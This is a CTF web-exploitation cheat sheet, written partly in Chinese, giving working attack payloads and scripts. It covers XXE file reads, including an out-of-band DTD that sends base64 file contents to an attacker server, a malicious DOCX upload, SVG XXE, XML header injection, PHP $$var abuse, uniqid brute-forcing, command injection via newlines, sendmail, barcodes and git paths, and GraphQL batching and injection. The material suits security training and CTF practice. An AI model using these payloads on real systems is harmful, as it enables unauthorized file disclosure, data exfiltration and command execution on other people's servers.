# CTF Web - XXE, XML Injection, Command Injection, GraphQL

XXE 载荷、XML 注入、PHP variable-variable 技巧、顺序正则绕过、命令注入与 GraphQL 利用。核心服务端注入主题（PHP 类型混淆、文件包含、SSTI、SSRF）见 [server-side.md](server-side.md)。

## Table of Contents
- [XXE (XML External Entity)](#xxe-xml-external-entity)
  - [Basic XXE](#basic-xxe)
  - [OOB XXE with External DTD](#oob-xxe-with-external-dtd)
  - [XXE via DOCX/Office XML Upload (School CTF 2016)](#xxe-via-docxoffice-xml-upload-school-ctf-2016)
  - [SVG XXE via svglib to PNG Pipeline (P.W.N. CTF 2018)](#svg-xxe-via-svglib-to-png-pipeline-pwn-ctf-2018)
- [XML Injection via X-Forwarded-For Header (Pwn2Win 2016)](#xml-injection-via-x-forwarded-for-header-pwn2win-2016)
- [PHP Variable Variables ($$var) Abuse (bugs_bunny 2017)](#php-variable-variables-var-abuse-bugs_bunny-2017)
- [PHP uniqid() Predictable Filename (EKOPARTY 2017)](#php-uniqid-predictable-filename-ekoparty-2017)
- [Sequential Regex Replacement Bypass (Tokyo Westerns 2017)](#sequential-regex-replacement-bypass-tokyo-westerns-2017)
- [Command Injection](#command-injection)
  - [Newline Bypass](#newline-bypass)
  - [Incomplete Blocklist Bypass](#incomplete-blocklist-bypass)
  - [Sendmail Parameter Injection via CGI (SECCON 2015)](#sendmail-parameter-injection-via-cgi-seccon-2015)
  - [Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)](#multi-barcode-concatenation-to-shell-injection-bsidessf-2024)
  - [Git CLI Newline Injection via URL Path (BSidesSF 2026)](#git-cli-newline-injection-via-url-path-bsidessf-2026)
- [GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)](#graphql-injection-and-exploitation-hacklu-ctf-2020-heroctf-v5)
  - [Introspection and Schema Discovery](#introspection-and-schema-discovery)
  - [Query Batching and Aliasing for Rate Limit Bypass](#query-batching-and-aliasing-for-rate-limit-bypass)
  - [String Interpolation Injection](#string-interpolation-injection)

---

## XXE (XML External Entity)

### Basic XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### OOB XXE with External DTD
托管恶意 `evil.dtd`：
```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://YOUR-SERVER/flag?b64=%file;'>">
%eval; %exfil;
```

### XXE via DOCX/Office XML Upload (School CTF 2016)

DOCX 本质上是包含 XML 的 ZIP 包。修改 DOCX 内的 `[Content_Types].xml`，可注入 XXE 载荷，在服务器解析上传文档时触发。

```bash
# Step 1: Create a minimal DOCX and extract it
mkdir docx_exploit && cd docx_exploit
unzip template.docx

# Step 2: Inject XXE into [Content_Types].xml
cat > '[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/index.php">
]>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/hack" ContentType="&xxe;"/>
</Types>
EOF

# Step 3: Repackage as DOCX
zip -r exploit.docx '[Content_Types].xml' word/ _rels/

# Step 4: Upload to target
curl -F "file=@exploit.docx" http://target/upload
# Response or error message may contain base64-encoded file contents
```

**关键点：** 任何基于 ZIP+XML 的文件格式（DOCX、XLSX、PPTX、ODT、SVG+ZIP）都可能携带 XXE。解析器通常最先处理 `[Content_Types].xml`，因此它是理想注入点。用 `php://filter/convert.base64-encode` 做外带时，对二进制内容更稳。

### SVG XXE via svglib to PNG Pipeline (P.W.N. CTF 2018)

**模式：** 服务用 `svglib` + `reportlab` 把用户上传的 SVG 转为 PNG。SVG 解析器会在栅格化前展开外部实体，因此放在 `<text>` 元素里的 XXE 实体会被直接**绘制**到 PNG 像素中。

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE foo [<!ENTITY dat SYSTEM "file:///opt/key.txt">]>
<svg xmlns="http://www.w3.org/2000/svg" width="200mm" height="10mm">
  <text x="10" y="15" font-size="4" fill="red">&dat;</text>
</svg>
```

生成的 PNG 会把 flag 渲染为可见文本。下载图片后直接查看或 OCR 即可。

**关键点：** 各类 SVG 转图片链（`svglib`、`cairosvg`、`rsvg-convert`、librsvg）都会在解析阶段处理 XXE 实体，因此文件内容可以借图像通道带出来。泄露内容在像素里，不在元数据里，`grep` 没意义，直接打开图。

**参考：** P.W.N. CTF 2018 — SVG2PNG, writeup 12064

---

## XML Injection via X-Forwarded-For Header (Pwn2Win 2016)

应用把 HTTP 头（例如 `X-Forwarded-For`）直接拼进 XML 且未转义。借助“同名标签取第一个”的解析语义，可注入任意元素：

```http
X-Forwarded-For: 1.2.3.4</ip><admin>true</admin><ip>4.3.2.1
```

结果会变成：`<session><ip>1.2.3.4</ip><admin>true</admin><ip>4.3.2.1</ip><admin>false</admin></session>`  
解析器会取第一个 `<admin>true</admin>`，忽略后面正常的 `<admin>false</admin>`。

**关键点：** 当服务端把 HTTP 头值未经转义地嵌入 XML 时，就可能出现 XML 注入。重名标签的 first-match 语义可直接被拿来提权。凡是会在响应、日志或结构化数据中出现的请求头（`X-Forwarded-For`、`User-Agent`、`Referer`）都要测。

---

## PHP Variable Variables ($$var) Abuse (bugs_bunny 2017)

**模式：** PHP 的 variable variables（`$$key`）会把变量值当成另一个变量名使用。当代码遍历 GET/POST 参数并执行 `$$key = $$value` 时，传入 `?_200=flag` 就能把 `$flag` 的值复制到 `$_200`，再在其被覆盖前读出。

```php
// Vulnerable pattern: loop that processes GET parameters as variable aliases
foreach ($_GET as $key => $value) {
    $$key = $$value;  // e.g., key="_200", value="flag" → $_200 = $flag
}
// Later: echo $_200;  // outputs the flag
```

```bash
# Supply a "safe" output variable name as key, protected variable name as value
curl "http://target/page.php?_200=flag"
# PHP executes: $_200 = $flag → flag is now in $_200 which gets echoed
```

**如何找可输出变量：** 观察源码里以 HTTP 状态码命名的变量（如 `$_200`、`$_404`），或任何最终会被输出、且变量名以下划线开头的变量。

**关键点：** `$$key` 允许攻击者重定向变量引用。若代码遍历用户输入并执行 `$$key = $$value`，攻击者就能把受保护变量（如 `$flag`）映射到自己可控且会被输出的变量名上。

---

## PHP uniqid() Predictable Filename (EKOPARTY 2017)

**模式：** PHP 的 `uniqid()` 内部使用 `gettimeofday()`。返回值前 8 个十六进制字符就是 Unix 秒级时间戳，因此文件名在一个有限时间窗内可预测。

```php
// Vulnerable: uses uniqid() to name an uploaded/generated file
$filename = uniqid() . '_flag.txt';
// e.g., "5a1b2c3d4e5f6_flag.txt" where first 8 chars = hex(unix_timestamp)
```

```python
import requests
import time

# Know approximate upload time (from server Date header, challenge hint, etc.)
start_ts = int(time.time()) - 60   # 60 second window before now
end_ts   = int(time.time()) + 10

for ts in range(start_ts, end_ts):
    hex_prefix = format(ts, '08x')
    url = f'http://target/uploads/{hex_prefix}_flag.txt'
    r = requests.get(url)
    if r.status_code == 200:
        print(f"Found: {url}")
        print(r.text)
        break
```

**缩小时间窗：** 触发文件创建时记录服务器响应里的 `Date` 头，可得到服务器当前时间；文件名前缀就对应那一秒。

**关键点：** PHP `uniqid()` 的前 8 位十六进制就是秒级时间戳。只要大概知道生成时间，爆破复杂度就是“窗口秒数”，通常几十到一百次请求内就能命中。

---

## Sequential Regex Replacement Bypass (Tokyo Westerns 2017)

**模式：** 清洗器若按顺序依次做正则替换，而不是一次性处理，那么前一个替换可能在后一个替换之后重新拼出危险子串，导致本应被拦截的内容存活下来。

```php
// Vulnerable: replacements run in sequence on the same string
$input = preg_replace('/on\w+=\S+/', '', $input);   // pass 1: strip event handlers
$input = preg_replace('/<script[^>]*>/', '', $input); // pass 2: strip script tags
```

```text
# Embed the dangerous tag inside the blocked pattern so removal reconstructs it:
# Input: <scr<script>ipt>
# Pass 2 strips inner <script> → leaves: <script>
# The outer "scr...ipt" scaffolding is reassembled after the inner match is removed.
```

```bash
# Practical bypass — embed the dangerous string inside the blocked string:
# If filter strips "script" then strips "on.*=":
curl "http://target/" --data 'input=<img sron=c onerror=alert(1)>'
# Pass 1 strips "onerror=" leaving  <img src onerror=alert(1)> with partial strip
# Exact bypass depends on regex — test with variations like:
# <scr\x00ipt>, <scr ipt>, embed keyword inside itself
```

**关键点：** 顺序正则替换会让第 N 步重新构造出第 M 步本应拦截的危险模式。解决方式是使用基于解析器的清洗器，或保证清洗逻辑单次、幂等完成。

---

## Command Injection

### Newline Bypass
```bash
curl -X POST http://target/ --data-urlencode "target=127.0.0.1
cat flag.txt"
curl -X POST http://target/ -d "ip=127.0.0.1%0acat%20flag.txt"
```

### Incomplete Blocklist Bypass
若 `cat` / `head` / `less` 被拦截，可试 `sed -n p flag.txt`、`awk '{print}'`、`tac flag.txt`。  
常见漏项：`;` 分号、反引号、`$()` 命令替换。

### Sendmail Parameter Injection via CGI (SECCON 2015)

当 CGI 脚本通过 `open()` 管道把用户输入传给 `sendmail`：

```perl
open(SH, "|/usr/sbin/sendmail -bm '$user_input'");
```

可通过跳出引号上下文注入 shell 命令：

```bash
mail=' -bp|ls SECRETS #
mail=' -bp|cat SECRETS/backdoor123.php #
```

`-bp` 会让 sendmail 进入打印队列模式（非交互），随后 `|` 把输出接进 shell。常见发现链是：先找到 `.cgi_bak` 备份文件拿源码，再定位注入点，最后执行命令。

### Multi-Barcode Concatenation to Shell Injection (BSidesSF 2024)

当服务端处理包含条码的图像（如 zbar/zxing）时，一张图里若有多个条码，扫描结果可能会被拼成一个字符串。于是可以把“合法条码”和“恶意 Code128 条码”放在同一张图里，拼接后注入到 `system()` 或 JSON 解析逻辑。

1. **制作合法条码：** 生成一个通过类型校验的 UPC/EAN-13。
2. **制作注入条码：** 生成带 shell 元字符的 Code128：
   ```text
   test", "node": "hi'; cat /flag > /tmp/out; #
   ```
3. **拼到一张图：** `montage valid.png malicious.png -tile 2x1 combined.png`
4. **上传：** 扫描器读出全部条码，拼接后交给后续处理。

```bash
# Generate Code128 barcode with injection payload
python3 -c "
import barcode
from barcode.writer import ImageWriter
code = barcode.get('code128', 'test\", \"node\": \"x\x27; cat /flag >&5; #', writer=ImageWriter())
code.save('inject')
"
# Combine with valid UPC barcode
montage valid_upc.png inject.png -tile 2x1 -geometry +0+0 payload.png
```

**关键点：** 条码库通常会处理图中**全部**可识别条码。类型校验可能只检查第一个条码，但所有结果的拼接值却会进入后续逻辑。这和 HTTP 参数污染非常像，只不过输入载体换成了图像。

### Git CLI Newline Injection via URL Path (BSidesSF 2026)

**模式（gitfab）：** Web 仓库浏览器通过反引号调用 git CLI：`` `git show "#{path}"` ``。应用虽然过滤了 `<`、`>`、`|`、`;`、`&` 等 shell 元字符，却允许换行。URL 编码后的换行 `%0a` 能把 git 命令拆开，再注入任意 shell 命令。

```text
GET /file/test%22%0acat%20/home/ctf/flag.txt%0aecho%20%22 HTTP/1.1
```

解码后即：
```bash
git show "test"
cat /home/ctf/flag.txt
echo ""
```

```ruby
require 'httparty'

# URL-encode newline injection
path = 'test"%0acat /home/ctf/flag.txt%0aecho "'
response = HTTParty.get("http://target/file/#{URI.encode_www_form_component(path)}")
puts response.body
```

**关键点：** 换行（`\n`、`%0a`）常被命令注入过滤器忽略。虽然 `;`、`|`、`&` 往往会被拦，但换行同样是 shell 的命令分隔符，而且又是 URL 中合法字符。只要路径参数最终通过字符串插值进入 shell（反引号、`system()`、`popen()`），未过滤换行就能打。

**识别时机：** Web 应用调用 git、svn 等 CLI 工具；源码里可见 shell 插值且只做部分黑名单过滤。测试时优先尝试 `%0a` 和 `%0d%0a`。

**防御检查：** 过滤器是否拦截 `\n`（0x0a）？是否使用 allowlist 而非 blocklist？是否改用 `execve()` 这类无 shell 执行方式，而不是 `system()`？

---

## GraphQL Injection and Exploitation (Hack.lu CTF 2020, HeroCTF v5)

### Introspection and Schema Discovery

```graphql
# Full schema enumeration (often left enabled in CTFs)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# Shortened introspection query
{__type(name:"Query"){fields{name,type{name,ofType{name}}}}}

# Find all mutations
{__schema{mutationType{fields{name,args{name,type{name}}}}}}

# Find hidden types
{__schema{types{name,kind,description}}}
```

### Query Batching and Aliasing for Rate Limit Bypass

```graphql
# Execute same mutation N times in single request via aliases
mutation {
  a1: increaseVote(id: "target") { count }
  a2: increaseVote(id: "target") { count }
  a3: increaseVote(id: "target") { count }
  # ... repeat 1337 times
}

# Or via array batching (if supported):
# POST body: [{"query":"mutation{vote(id:\"x\"){ok}}"}, {"query":"mutation{vote(id:\"x\"){ok}}"}, ...]
```

### String Interpolation Injection

```javascript
// Vulnerable server code pattern:
const query = `mutation { doAction(input: "${userInput}") { result } }`;

// Injection payload:
// userInput = ") { result } } mutation { adminAction(secret: true) { flag } } #"
// Resulting query:
// mutation { doAction(input: "") { result } } mutation { adminAction(secret: true) { flag } } #") { result } }
```

**关键点：** GraphQL 同时具有查询语言的表达能力和 REST 风格的统一入口，因此主要攻击面有三类：  
（1）introspection 暴露完整 schema；  
（2）query batching / aliasing 可绕过限速并放大操作；  
（3）服务端用字符串插值拼 GraphQL 语句时，会出现类似 SQLi 的注入。

---

*另见：[server-side-exec.md](server-side-exec.md) 侧重代码执行类攻击（Ruby/Perl/JS/LaTeX/Prolog 注入、PHP preg_replace /e、ReDoS、文件上传到 RCE、PHP 反序列化、XPath 注入、Thymeleaf SpEL SSTI）；[server-side-exec-2.md](server-side-exec-2.md) 包含 SQLi 关键字拆分、SQL WHERE 绕过、基于 DNS 的 SQL、bash 花括号展开、Common Lisp 注入、PHP7 OPcache、PNG/PHP polyglot 上传等。*
